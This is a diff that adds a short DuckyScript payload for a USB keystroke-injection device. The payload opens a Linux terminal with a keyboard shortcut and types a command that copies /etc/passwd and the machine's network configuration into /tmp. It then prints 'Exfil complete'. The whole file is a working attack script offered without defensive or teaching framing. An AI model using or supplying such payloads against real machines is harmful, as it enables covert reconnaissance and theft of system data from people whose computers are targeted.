@@ -1,0 +1,7 @@
+REM Copy /etc/passwd and network info to /tmp
+DEFAULT_DELAY 100
+DELAY 500
+CTRL ALT t
+DELAY 2000
+STRING cp /etc/passwd /tmp/passwd_dump.txt && ip addr > /tmp/network_info.txt && echo "Exfil complete: /tmp/passwd_dump.txt /tmp/network_info.txt"
+ENTER
